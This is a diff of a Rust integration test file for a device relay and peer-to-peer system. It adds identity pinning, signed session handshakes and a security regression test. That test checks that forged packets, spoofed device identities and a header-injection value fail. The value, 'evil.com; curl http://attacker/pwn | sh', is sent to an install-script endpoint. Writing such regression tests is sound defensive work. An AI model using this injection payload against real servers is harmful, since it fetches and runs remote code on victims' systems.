@@ -4,13 +4,14 @@ use base64::{engine::general_purpose::STANDARD as B64, Engine as _};
 use coda_daemon::{
     discover_local_endpoints_with_port, list_account_hosts, mint_peer_relay_config,
     poll_device_login_once, run_daemon_once_with_p2p, spawn_direct_p2p_listener,
-    spawn_lan_udp_beacon, start_device_login_flow, DirectP2pClient, SmartPeerClient,
-    SmartRelayFallbackConfig,
+    spawn_lan_udp_beacon, start_device_login_flow, DirectP2pClient, PeerIdentityPin,
+    SmartPeerClient, SmartRelayFallbackConfig,
 };
 use coda_herdr::{discover_hc_binary, HerdrClient};
 use coda_protocol::{
-    E2eeSession, NetworkEndpointCandidate, PeerMessage, RelayWireFrame, StoredDeviceIdentity,
-    TrafficLane, VoiceModelConfig,
+    current_unix_ms, p2p_ack_v2_signing_bytes, p2p_hello_v2_signing_bytes, E2eeSession,
+    NetworkEndpointCandidate, PeerMessage, RelaySessionAuth, RelayWireFrame,
+    StoredDeviceIdentity, TrafficLane, VoiceModelConfig,
 };
 use coda_server::{
     db::{DeviceAuthPublicInfo, DeviceRecord, InviteCodeRecord},
@@ -223,7 +224,7 @@ async fn test_multi_tenant_postgres_and_raw_tcp_e2ee_herdr_tunnel() {
     );
 
     // 6. Owner registers iPhone Duo client and connects over Raw TCP No-SNI with E2EE!
-    let iphone_duo_id = StoredDeviceIdentity::generate("Vampire iPhone Duo");
+    let mut iphone_duo_id = StoredDeviceIdentity::generate("Vampire iPhone Duo");
     let iphone_dev: DeviceRecord = http
         .post(format!("{base}/api/v1/devices/register-client"))
         .bearer_auth(&owner_auth.token)
@@ -241,6 +242,7 @@ async fn test_multi_tenant_postgres_and_raw_tcp_e2ee_herdr_tunnel() {
         .json()
         .await
         .unwrap();
+    iphone_duo_id.device_id = Some(iphone_dev.id);
 
     let ticket_resp: MintRelayTicketResponse = http
         .post(format!("{base}/api/v1/relay/ticket"))
@@ -272,10 +274,21 @@ async fn test_multi_tenant_postgres_and_raw_tcp_e2ee_herdr_tunnel() {
     let ack = read_len_frame(&mut raw_stream).await;
     assert!(matches!(ack, RelayWireFrame::AuthAck { ok: true, .. }));
 
-    // Derive Zero-Knowledge E2EE session on iPhone Duo
-    let mut e2ee = E2eeSession::derive(
+    // Derive Zero-Knowledge Relay v2 E2EE session on iPhone Duo
+    let relay_auth = RelaySessionAuth::create(
+        &iphone_duo_id,
+        daemon_cfg.device_id,
+        true,
+        current_unix_ms(),
+    )
+    .unwrap();
+    let mut e2ee = E2eeSession::derive_relay_session(
         &iphone_duo_id.x25519_secret().unwrap(),
         &daemon_cfg.identity.x25519_public_b64,
+        &relay_auth.session_nonce_b64,
+        iphone_dev.id,
+        daemon_cfg.device_id,
+        true,
         true,
     )
     .unwrap();
@@ -292,7 +305,8 @@ async fn test_multi_tenant_postgres_and_raw_tcp_e2ee_herdr_tunnel() {
         dst_device_id: daemon_cfg.device_id,
         lane: TrafficLane::ControlP0,
         e2ee: sealed_ping,
-        sender_x25519_pub_b64: Some(iphone_duo_id.x25519_public_b64.clone()),
+        sender_x25519_pub_b64: None,
+        session_auth: Some(relay_auth.clone()),
     };
     raw_stream
         .write_all(&pkt.encode_length_delimited().unwrap())
@@ -341,6 +355,7 @@ async fn test_multi_tenant_postgres_and_raw_tcp_e2ee_herdr_tunnel() {
                     lane: TrafficLane::ControlP0,
                     e2ee: sealed_launch,
                     sender_x25519_pub_b64: None,
+                    session_auth: Some(relay_auth.clone()),
                 }
                 .encode_length_delimited()
                 .unwrap(),
@@ -348,19 +363,28 @@ async fn test_multi_tenant_postgres_and_raw_tcp_e2ee_herdr_tunnel() {
             .await
             .unwrap();
 
-        let launch_pkt = next_route_packet(&mut raw_stream).await;
-        let term_addr = if let RelayWireFrame::RoutePacket { e2ee: enc_res, .. } = launch_pkt {
+        let mut term_addr = None;
+        for _ in 0..16 {
+            let launch_pkt = next_route_packet(&mut raw_stream).await;
+            let RelayWireFrame::RoutePacket { e2ee: enc_res, .. } = launch_pkt else {
+                panic!("expected launch RoutePacket, got {launch_pkt:?}");
+            };
             match e2ee.open_message(&enc_res).unwrap() {
                 PeerMessage::LaunchAgentResult {
                     ok: true,
                     terminal: Some(t),
                     ..
-                } => t.address,
+                } => {
+                    term_addr = Some(t.address);
+                    break;
+                }
+                PeerMessage::HerdrLiveEvent { .. } | PeerMessage::PtyOutputChunk { .. } => {
+                    continue;
+                }
                 other => panic!("unexpected launch result: {other:?}"),
             }
-        } else {
-            panic!("expected launch RoutePacket");
-        };
+        }
+        let term_addr = term_addr.expect("LaunchAgentResult within 16 packets");
 
         // Clean up test terminal in herdr
         let hc = HerdrClient::connect_with_bin(hc_bin).await.unwrap();
@@ -431,6 +455,7 @@ async fn test_multi_tenant_postgres_and_raw_tcp_e2ee_herdr_tunnel() {
                 lane: TrafficLane::ControlP0,
                 e2ee: sealed_ping2,
                 sender_x25519_pub_b64: None,
+                session_auth: Some(relay_auth.clone()),
             })
             .unwrap()
             .into(),
@@ -472,11 +497,16 @@ async fn test_multi_tenant_postgres_and_raw_tcp_e2ee_herdr_tunnel() {
     .await
     .unwrap();
 
+    let daemon_pin = PeerIdentityPin {
+        ed25519_pub_b64: daemon_cfg.identity.ed25519_public_b64.clone(),
+        x25519_pub_b64: daemon_cfg.identity.x25519_public_b64.clone(),
+    };
     let mut p2p_client = DirectP2pClient::connect_direct(
         &p2p_addr.to_string(),
         &iphone_duo_id,
         iphone_dev.id,
         daemon_cfg.device_id,
+        &daemon_pin,
     )
     .await
     .unwrap();
@@ -670,16 +700,38 @@ async fn test_multi_tenant_postgres_and_raw_tcp_e2ee_herdr_tunnel() {
     }
 
     // 10a. Browser WebSocket connecting DIRECTLY to `ws://<p2p_addr>` (same port as Raw TCP `DirectP2pClient`!)
+    let web_id = StoredDeviceIdentity::generate("Browser Web Console");
+    let web_dev: DeviceRecord = http
+        .post(format!("{base}/api/v1/devices/register-client"))
+        .bearer_auth(&owner_auth.token)
+        .json(&json!({
+            "name": "Browser Web Console",
+            "platform": "web",
+            "ed25519_pubkey": web_id.ed25519_public_b64,
+            "x25519_pubkey": web_id.x25519_public_b64,
+        }))
+        .send()
+        .await
+        .unwrap()
+        .error_for_status()
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
+    let web_client_id = web_dev.id;
+
     let lan_ws_url = format!("ws://{p2p_addr}");
     let (mut lan_ws, _) = connect_async(&lan_ws_url).await.unwrap();
-    let ts_ms = std::time::SystemTime::now()
-        .duration_since(std::time::UNIX_EPOCH)
-        .unwrap()
-        .as_millis() as u64;
-    let web_id = StoredDeviceIdentity::generate("Browser Web Console");
-    let web_client_id = iphone_dev.id;
-    let signed_msg = format!("p2p:{web_client_id}:{}:{ts_ms}", daemon_cfg.device_id);
-    let sig_b64 = web_id.sign(signed_msg.as_bytes()).unwrap();
+    let ts_ms = current_unix_ms();
+    let (web_eph_secret, web_eph_pub_b64) = StoredDeviceIdentity::generate_ephemeral_x25519();
+    let hello_signing = p2p_hello_v2_signing_bytes(
+        web_client_id,
+        daemon_cfg.device_id,
+        &web_id.x25519_public_b64,
+        &web_eph_pub_b64,
+        ts_ms,
+    );
+    let sig_b64 = web_id.sign(&hello_signing).unwrap();
 
     lan_ws
         .send(WsMsg::Text(
@@ -688,8 +740,10 @@ async fn test_multi_tenant_postgres_and_raw_tcp_e2ee_herdr_tunnel() {
                 target_device_id: daemon_cfg.device_id,
                 client_ed25519_pub_b64: web_id.ed25519_public_b64.clone(),
                 client_x25519_pub_b64: web_id.x25519_public_b64.clone(),
+                client_ephemeral_x25519_pub_b64: web_eph_pub_b64.clone(),
                 timestamp_ms: ts_ms,
                 signature_b64: sig_b64,
+                supports_zstd: true,
             })
             .unwrap()
             .into(),
@@ -702,22 +756,51 @@ async fn test_multi_tenant_postgres_and_raw_tcp_e2ee_herdr_tunnel() {
         other => panic!("expected DirectP2pAck text frame, got {other:?}"),
     };
     let ack_frame: RelayWireFrame = serde_json::from_str(&ack_txt).unwrap();
-    match ack_frame {
+    let daemon_eph_pub = match ack_frame {
         RelayWireFrame::DirectP2pAck {
             ok: true,
             daemon_device_id,
+            daemon_ed25519_pub_b64,
+            daemon_x25519_pub_b64,
+            daemon_ephemeral_x25519_pub_b64,
+            timestamp_ms: ack_ts,
+            signature_b64: ack_sig,
             path_kind,
             ..
         } => {
             assert_eq!(daemon_device_id, daemon_cfg.device_id);
+            assert_eq!(
+                daemon_ed25519_pub_b64,
+                daemon_cfg.identity.ed25519_public_b64
+            );
+            assert_eq!(daemon_x25519_pub_b64, daemon_cfg.identity.x25519_public_b64);
             assert_eq!(path_kind, "lan_ws");
+            let ack_signed = p2p_ack_v2_signing_bytes(
+                web_client_id,
+                daemon_device_id,
+                &web_eph_pub_b64,
+                &daemon_ephemeral_x25519_pub_b64,
+                ack_ts,
+            );
+            StoredDeviceIdentity::verify_signature(
+                &daemon_cfg.identity.ed25519_public_b64,
+                &ack_signed,
+                &ack_sig,
+            )
+            .unwrap();
+            daemon_ephemeral_x25519_pub_b64
         }
         other => panic!("unexpected direct WS ack: {other:?}"),
-    }
+    };
 
-    let mut lan_ws_e2ee = E2eeSession::derive(
+    let mut lan_ws_e2ee = E2eeSession::derive_ephemeral_p2p(
         &web_id.x25519_secret().unwrap(),
         &daemon_cfg.identity.x25519_public_b64,
+        &web_eph_secret,
+        &daemon_eph_pub,
+        web_client_id,
+        daemon_cfg.device_id,
+        true,
         true,
     )
     .unwrap();
@@ -734,7 +817,8 @@ async fn test_multi_tenant_postgres_and_raw_tcp_e2ee_herdr_tunnel() {
                 dst_device_id: daemon_cfg.device_id,
                 lane: TrafficLane::ControlP0,
                 e2ee: sealed_ws_ping,
-                sender_x25519_pub_b64: Some(web_id.x25519_public_b64.clone()),
+                sender_x25519_pub_b64: None,
+                session_auth: None,
             })
             .unwrap()
             .into(),
@@ -860,12 +944,14 @@ async fn test_multi_tenant_postgres_and_raw_tcp_e2ee_herdr_tunnel() {
         iphone_duo_id.clone(),
         iphone_dev.id,
         daemon_cfg.device_id,
+        daemon_pin.clone(),
         vec![],
         Some(udp_beacon_addr),
         Some(SmartRelayFallbackConfig {
             raw_tcp_addr: Some(server.raw_tcp_addr.to_string()),
             wss_url: None,
             relay_ticket: failover_ticket.ticket,
+            peer_ed25519_pub_b64: daemon_cfg.identity.ed25519_public_b64.clone(),
             peer_x25519_pub_b64: daemon_cfg.identity.x25519_public_b64.clone(),
         }),
     )
@@ -1247,20 +1333,27 @@ async fn test_open_portal_device_code_rfc8628_and_cloudflare_wss_mesh() {
         mac_cfg.session_token.as_deref().unwrap(),
         mac_cfg.device_id,
         linux_cfg.device_id,
+        &linux_cfg.identity.ed25519_public_b64,
         &linux_cfg.identity.x25519_public_b64,
     )
     .await
     .unwrap();
+    let linux_pin = PeerIdentityPin {
+        ed25519_pub_b64: linux_cfg.identity.ed25519_public_b64.clone(),
+        x25519_pub_b64: linux_cfg.identity.x25519_public_b64.clone(),
+    };
     let mut smart = SmartPeerClient::connect_auto(
         mac_cfg.identity.clone(),
         mac_cfg.device_id,
         linux_cfg.device_id,
+        linux_pin,
         vec![],
         None,
         Some(SmartRelayFallbackConfig {
             raw_tcp_addr: None,
             wss_url: rcfg.wss_url,
             relay_ticket: rcfg.relay_ticket,
+            peer_ed25519_pub_b64: rcfg.peer_ed25519_pub_b64,
             peer_x25519_pub_b64: rcfg.peer_x25519_pub_b64,
         }),
     )
@@ -1306,4 +1399,371 @@ async fn next_route_packet(stream: &mut TcpStream) -> RelayWireFrame {
             _ => {}
         }
     }
+}
+
+#[tokio::test]
+async fn test_security_hardening_regressions() {
+    let _guard = DB_TEST_LOCK.get_or_init(|| Mutex::new(())).lock().await;
+    let db_url = std::env::var("TEST_DATABASE_URL")
+        .unwrap_or_else(|_| "postgres://vampire@localhost:5432/coda_test".to_string());
+
+    let _ = coda_server::db::Db::connect_and_migrate(&db_url)
+        .await
+        .expect("PostgreSQL coda_test should migrate");
+    let (pg, conn) = tokio_postgres::connect(&db_url, tokio_postgres::NoTls)
+        .await
+        .unwrap();
+    tokio::spawn(async move {
+        let _ = conn.await;
+    });
+    pg.batch_execute(
+        "TRUNCATE device_auth_requests, pairing_tokens, devices, auth_sessions, invite_codes, users RESTART IDENTITY CASCADE;",
+    )
+    .await
+    .unwrap();
+
+    let server = start_full_server_with_options(
+        &db_url,
+        "127.0.0.1:0".parse::<SocketAddr>().unwrap(),
+        "127.0.0.1:0".parse::<SocketAddr>().unwrap(),
+        b"security-regression-hmac-secret-2026".to_vec(),
+        None,
+        None,
+        ServerOptions {
+            open_registration: true,
+            ..ServerOptions::default()
+        },
+    )
+    .await
+    .unwrap();
+
+    let base = format!("http://{}", server.http_addr);
+    let http = reqwest::Client::new();
+
+    // Register victim account + attacker account
+    let victim_auth: AuthResponse = http
+        .post(format!("{base}/api/v1/auth/register"))
+        .json(&json!({
+            "email": "victim@coda.dev",
+            "handle": "victim",
+            "display_name": "Victim",
+            "password": "VictimPass2026!",
+        }))
+        .send()
+        .await
+        .unwrap()
+        .error_for_status()
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
+
+    // (e) Query-string ?token= MUST be rejected on /api/v1/events/ws with 401
+    let ws_base = base.replacen("http://", "ws://", 1);
+    let qs_err = tokio_tungstenite::connect_async(format!(
+        "{ws_base}/api/v1/events/ws?token={}",
+        victim_auth.token
+    ))
+    .await
+    .expect_err("/api/v1/events/ws?token= must be rejected");
+    if let tokio_tungstenite::tungstenite::Error::Http(resp) = qs_err {
+        assert_eq!(resp.status(), 401);
+    }
+
+    // Subprotocol auth ["coda-auth", "coda-bearer.<tok>"] works cleanly
+    {
+        use tokio_tungstenite::tungstenite::{client::IntoClientRequest, http::HeaderValue};
+        let mut req = format!("{ws_base}/api/v1/events/ws")
+            .into_client_request()
+            .unwrap();
+        req.headers_mut().insert(
+            "Sec-WebSocket-Protocol",
+            HeaderValue::from_str(&format!("coda-auth, coda-bearer.{}", victim_auth.token)).unwrap(),
+        );
+        let (mut ws_stream, _) = tokio_tungstenite::connect_async(req)
+            .await
+            .expect("Sec-WebSocket-Protocol auth should succeed");
+        let first = ws_stream.next().await.unwrap().unwrap();
+        assert!(first.to_text().unwrap().contains("connected"));
+    }
+
+    // (c) Malicious X-Forwarded-Host must NOT inject shell payload into /install.sh
+    let install_resp = http
+        .get(format!("{base}/install.sh"))
+        .header("X-Forwarded-Host", "evil.com; curl http://attacker/pwn | sh")
+        .send()
+        .await
+        .unwrap();
+    assert_eq!(install_resp.status(), 200);
+    let script_txt = install_resp.text().await.unwrap();
+    assert!(!script_txt.contains("evil.com"));
+    assert!(!script_txt.contains("attacker/pwn"));
+
+    // Pair daemon under victim account
+    let pair_tok: PairTokenResponse = http
+        .post(format!("{base}/api/v1/devices/pair-token"))
+        .bearer_auth(&victim_auth.token)
+        .json(&json!({ "suggested_name": "Victim-Host" }))
+        .send()
+        .await
+        .unwrap()
+        .error_for_status()
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
+    let daemon_cfg =
+        coda_daemon::pair_daemon_with_code(&base, &pair_tok.code, Some("Victim-Host".into()))
+            .await
+            .unwrap();
+
+    let p2p_addr = spawn_direct_p2p_listener(
+        daemon_cfg.clone(),
+        "127.0.0.1:0".parse::<SocketAddr>().unwrap(),
+    )
+    .await
+    .unwrap();
+    let p2p_port = p2p_addr.port();
+    let daemon_cfg_bg = daemon_cfg.clone();
+    let daemon_task = tokio::spawn(async move {
+        let _ = run_daemon_once_with_p2p(&daemon_cfg_bg, Some("raw_tcp_no_sni"), Some(p2p_port))
+            .await;
+    });
+    tokio::time::sleep(std::time::Duration::from_millis(200)).await;
+
+    // Register victim legitimate client
+    let mut leg_id = StoredDeviceIdentity::generate("Victim-Phone");
+    let leg_dev: DeviceRecord = http
+        .post(format!("{base}/api/v1/devices/register-client"))
+        .bearer_auth(&victim_auth.token)
+        .json(&json!({
+            "name": "Victim-Phone",
+            "platform": "ios",
+            "ed25519_pubkey": leg_id.ed25519_public_b64,
+            "x25519_pubkey": leg_id.x25519_public_b64,
+        }))
+        .send()
+        .await
+        .unwrap()
+        .error_for_status()
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
+    leg_id.device_id = Some(leg_dev.id);
+
+    // (a) Untrusted random device identity (and spoofed device_id with wrong key) MUST fail on :24444
+    let daemon_pin = PeerIdentityPin {
+        ed25519_pub_b64: daemon_cfg.identity.ed25519_public_b64.clone(),
+        x25519_pub_b64: daemon_cfg.identity.x25519_public_b64.clone(),
+    };
+    let attacker_id = StoredDeviceIdentity::generate("Attacker");
+    assert!(
+        DirectP2pClient::connect_direct(
+            &p2p_addr.to_string(),
+            &attacker_id,
+            uuid::Uuid::new_v4(),
+            daemon_cfg.device_id,
+            &daemon_pin,
+        )
+        .await
+        .is_err(),
+        "unknown device must be rejected on :24444"
+    );
+    assert!(
+        DirectP2pClient::connect_direct(
+            &p2p_addr.to_string(),
+            &attacker_id,
+            leg_dev.id,
+            daemon_cfg.device_id,
+            &daemon_pin,
+        )
+        .await
+        .is_err(),
+        "spoofed device_id with untrusted key must be rejected on :24444"
+    );
+
+    // Legitimate client establishes Relay v2 session
+    let leg_ticket: MintRelayTicketResponse = http
+        .post(format!("{base}/api/v1/relay/ticket"))
+        .bearer_auth(&victim_auth.token)
+        .json(&json!({
+            "device_id": leg_dev.id,
+            "peer_device_id": daemon_cfg.device_id,
+        }))
+        .send()
+        .await
+        .unwrap()
+        .error_for_status()
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
+    let mut relay_stream = TcpStream::connect(server.raw_tcp_addr).await.unwrap();
+    relay_stream
+        .write_all(
+            &RelayWireFrame::AuthBind {
+                ticket: leg_ticket.ticket.clone(),
+                lane: TrafficLane::ControlP0,
+                generation: 100,
+            }
+            .encode_length_delimited()
+            .unwrap(),
+        )
+        .await
+        .unwrap();
+    assert!(matches!(
+        read_len_frame(&mut relay_stream).await,
+        RelayWireFrame::AuthAck { ok: true, .. }
+    ));
+
+    let leg_auth = RelaySessionAuth::create(
+        &leg_id,
+        daemon_cfg.device_id,
+        true,
+        current_unix_ms(),
+    )
+    .unwrap();
+    let mut leg_e2ee = E2eeSession::derive_relay_session(
+        &leg_id.x25519_secret().unwrap(),
+        &daemon_cfg.identity.x25519_public_b64,
+        &leg_auth.session_nonce_b64,
+        leg_dev.id,
+        daemon_cfg.device_id,
+        true,
+        true,
+    )
+    .unwrap();
+
+    // Send valid Ping seq=1 -> establishes active Relay v2 session
+    let p1 = leg_e2ee
+        .seal_message(&PeerMessage::Ping {
+            req_id: "leg-1".into(),
+            sent_ms: 1,
+        })
+        .unwrap();
+    relay_stream
+        .write_all(
+            &RelayWireFrame::RoutePacket {
+                src_device_id: leg_dev.id,
+                dst_device_id: daemon_cfg.device_id,
+                lane: TrafficLane::ControlP0,
+                e2ee: p1,
+                sender_x25519_pub_b64: None,
+                session_auth: Some(leg_auth.clone()),
+            }
+            .encode_length_delimited()
+            .unwrap(),
+        )
+        .await
+        .unwrap();
+    let r1 = next_route_packet(&mut relay_stream).await;
+    if let RelayWireFrame::RoutePacket { e2ee, .. } = r1 {
+        assert!(matches!(
+            leg_e2ee.open_message(&e2ee).unwrap(),
+            PeerMessage::Pong { .. }
+        ));
+    }
+
+    // (b) Forged Relay seq=1 reset WITHOUT valid RelaySessionAuth MUST be dropped & MUST NOT reset leg_e2ee!
+    let mut forged_e2ee = E2eeSession::derive(
+        &attacker_id.x25519_secret().unwrap(),
+        &daemon_cfg.identity.x25519_public_b64,
+        true,
+    )
+    .unwrap();
+    let forged_p1 = forged_e2ee
+        .seal_message(&PeerMessage::Ping {
+            req_id: "forged-1".into(),
+            sent_ms: 2,
+        })
+        .unwrap();
+    relay_stream
+        .write_all(
+            &RelayWireFrame::RoutePacket {
+                src_device_id: leg_dev.id,
+                dst_device_id: daemon_cfg.device_id,
+                lane: TrafficLane::ControlP0,
+                e2ee: forged_p1,
+                sender_x25519_pub_b64: Some(attacker_id.x25519_public_b64.clone()),
+                session_auth: None,
+            }
+            .encode_length_delimited()
+            .unwrap(),
+        )
+        .await
+        .unwrap();
+
+    // Send seq=2 on the ORIGINAL legitimate leg_e2ee: proves active session was NOT reset by forged seq=1!
+    let p2 = leg_e2ee
+        .seal_message(&PeerMessage::Ping {
+            req_id: "leg-2".into(),
+            sent_ms: 3,
+        })
+        .unwrap();
+    relay_stream
+        .write_all(
+            &RelayWireFrame::RoutePacket {
+                src_device_id: leg_dev.id,
+                dst_device_id: daemon_cfg.device_id,
+                lane: TrafficLane::ControlP0,
+                e2ee: p2,
+                sender_x25519_pub_b64: None,
+                session_auth: None,
+            }
+            .encode_length_delimited()
+            .unwrap(),
+        )
+        .await
+        .unwrap();
+    let r2 = next_route_packet(&mut relay_stream).await;
+    if let RelayWireFrame::RoutePacket { e2ee, .. } = r2 {
+        match leg_e2ee.open_message(&e2ee).unwrap() {
+            PeerMessage::Pong { req_id, .. } => assert_eq!(req_id, "leg-2"),
+            other => panic!("expected leg-2 Pong (unforged session intact), got {other:?}"),
+        }
+    }
+
+    // (d) DELETE /api/v1/devices/{id} immediately disconnects active relay peer
+    let del_resp = http
+        .delete(format!("{base}/api/v1/devices/{}", leg_dev.id))
+        .bearer_auth(&victim_auth.token)
+        .send()
+        .await
+        .unwrap();
+    assert_eq!(del_resp.status(), 200);
+
+    let closed_or_eof = tokio::time::timeout(std::time::Duration::from_secs(3), async {
+        let mut buf = [0u8; 64];
+        loop {
+            match relay_stream.read(&mut buf).await {
+                Ok(0) | Err(_) => break true,
+                Ok(_) => continue,
+            }
+        }
+    })
+    .await
+    .unwrap_or(false);
+    assert!(
+        closed_or_eof,
+        "DELETE /api/v1/devices/{{id}} must disconnect active relay socket"
+    );
+
+    // POST /api/v1/auth/logout revokes session token immediately
+    let logout_resp = http
+        .post(format!("{base}/api/v1/auth/logout"))
+        .bearer_auth(&victim_auth.token)
+        .send()
+        .await
+        .unwrap();
+    assert_eq!(logout_resp.status(), 200);
+    let after_logout = http
+        .get(format!("{base}/api/v1/devices"))
+        .bearer_auth(&victim_auth.token)
+        .send()
+        .await
+        .unwrap();
+    assert_eq!(after_logout.status(), 401);
+
+    daemon_task.abort();
 }
